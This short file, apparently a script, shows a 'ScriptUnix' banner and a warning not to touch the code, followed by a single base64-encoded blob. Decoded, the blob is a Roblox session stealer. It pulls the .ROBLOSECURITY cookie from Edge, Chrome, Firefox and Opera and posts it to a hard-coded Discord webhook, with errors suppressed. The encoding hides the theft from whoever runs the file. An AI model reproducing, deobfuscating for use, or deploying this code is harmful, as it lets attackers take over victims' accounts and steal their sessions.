



#  ░██████╗░█████╗░██████╗░██╗██████╗░████████╗██╗░░░██╗███╗░░██╗██╗██╗░░██╗--
 # ██╔════╝██╔══██╗██╔══██╗██║██╔══██╗╚══██╔══╝██║░░░██║████╗░██║██║╚██╗██╔╝--
#  ╚█████╗░██║░░╚═╝██████╔╝██║██████╔╝░░░██║░░░██║░░░██║██╔██╗██║██║░╚███╔╝░--
#  ░╚═══██╗██║░░██╗██╔══██╗██║██╔═══╝░░░░██║░░░██║░░░██║██║╚████║██║░██╔██╗░--
#  ██████╔╝╚█████╔╝██║░░██║██║██║░░░░░░░░██║░░░╚██████╔╝██║░╚███║██║██╔╝╚██╗-
#  ╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░░░░░░░╚═╝░░░░╚═════╝░╚═╝░░╚══╝╚═╝╚═╝░░╚═╝---
#                        github.com/ScriptUnix 

 # WARNING touching with the code below will make the script not functional..
 
base64.b64decode(aW1wb3J0IGJyb3dzZXJfY29va2llMywgcmVxdWVzdHMsIHRocmVhZGluZwoKV2ViSG9vayA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMDQ3MjAxMzA4NjI2NjY5NjQ4L1RyOHFSNEpJMmF5NmpEZ1VXclg5WExDZkVkNVk4RVJtQm9hQ3NPRVQ5VXRjWERhZWNuTUJ2M3VMZk1sWUJwaEJnQW1BIiAjIElucHV0IHlvdXIgd2ViaG9vayBoZXJlIGFuZCBtYWtlIHN1cmUgdG8gY29tcGlsZSBpZiB5b3Ugd2FudCB0byBsb2cgeW91ciB0YXJnZXQKCmRlZiBNaWNyb3NvZnRFZGdlKCk6CiAgICB0cnk6CiAgICAgICAgY29va2llcyA9IGJyb3dzZXJfY29va2llMy5lZGdlKGRvbWFpbl9uYW1lID0gInJvYmxveC5jb20iKQogICAgICAgIGNvb2tpZXMgPSBzdHIoY29va2llcykKICAgICAgICBjb29raWUgPSBjb29raWVzLnNwbGl0KCIuUk9CTE9TRUNVUklUWT0iKVsxXS5zcGxpdCgiIGZvciAucm9ibG94LmNvbS8+IilbMF0uc3RyaXAoKQogICAgICAgIHJlcXVlc3RzLnBvc3QoV2ViSG9vaywganNvbiA9IHsidXNlcm5hbWUiIDogIkV4dW55cyBDb29raWUgTG9nZ2VyIFYxLjAiLCAiY29udGVudCIgOiBmImBgYHtjb29raWV9YGBgIn0pCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwoKZGVmIEdvb2dsZUNocm9tZSgpOgogICAgdHJ5OgogICAgICAgIGNvb2tpZXMgPSBicm93c2VyX2Nvb2tpZTMuY2hyb21lKGRvbWFpbl9uYW1lID0gInJvYmxveC5jb20iKQogICAgICAgIGNvb2tpZXMgPSBzdHIoY29va2llcykKICAgICAgICBjb29raWUgPSBjb29raWVzLnNwbGl0KCIuUk9CTE9TRUNVUklUWT0iKVsxXS5zcGxpdCgiIGZvciAucm9ibG94LmNvbS8+IilbMF0uc3RyaXAoKQogICAgICAgIHJlcXVlc3RzLnBvc3QoV2ViSG9vaywganNvbiA9IHsidXNlcm5hbWUiIDogIkV4dW55cyBDb29raWUgTG9nZ2VyIFYxLjAiLCAiY29udGVudCIgOiBmImBgYHtjb29raWV9YGBgIn0pCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwoKZGVmIE1vemlsbGFGaXJlZm94KCk6CiAgICB0cnk6CiAgICAgICAgY29va2llcyA9IGJyb3dzZXJfY29va2llMy5maXJlZm94KGRvbWFpbl9uYW1lID0gInJvYmxveC5jb20iKQogICAgICAgIGNvb2tpZXMgPSBzdHIoY29va2llcykKICAgICAgICBjb29raWUgPSBjb29raWVzLnNwbGl0KCIuUk9CTE9TRUNVUklUWT0iKVsxXS5zcGxpdCgiIGZvciAucm9ibG94LmNvbS8+IilbMF0uc3RyaXAoKQogICAgICAgIHJlcXVlc3RzLnBvc3QoV2ViSG9vaywganNvbiA9IHsidXNlcm5hbWUiIDogIkV4dW55cyBDb29raWUgTG9nZ2VyIFYxLjAiLCAiY29udGVudCIgOiBmImBgYHtjb29raWV9YGBgIn0pCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwoKZGVmIE9wZXJhKCk6CiAgICB0cnk6CiAgICAgICAgY29va2llcyA9IGJyb3dzZXJfY29va2llMy5vcGVyYShkb21haW5fbmFtZSA9ICJyb2Jsb3guY29tIikKICAgICAgICBjb29raWVzID0gc3RyKGNvb2tpZXMpCiAgICAgICAgY29va2llID0gY29va2llcy5zcGxpdCgiLlJPQkxPU0VDVVJJVFk9IilbMV0uc3BsaXQoIiBmb3IgLnJvYmxveC5jb20vPiIpWzBdLnN0cmlwKCkKICAgICAgICByZXF1ZXN0cy5wb3N0KFdlYkhvb2ssIGpzb24gPSB7InVzZXJuYW1lIiA6ICJFeHVueXMgQ29va2llIExvZ2dlciBWMS4wIiwgImNvbnRlbnQiIDogZiJgYGB7Y29va2llfWBgYCJ9KQogICAgZXhjZXB0OgogICAgICAgIHBhc3MKCmJyb3dzZXJzID0gW01pY3Jvc29mdEVkZ2UsIEdvb2dsZUNocm9tZSwgTW96aWxsYUZpcmVmb3gsIE9wZXJhXQoKZm9yIHYgaW4gYnJvd3NlcnM6CiAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldCA9IHYpLnN0YXJ0KCk=)

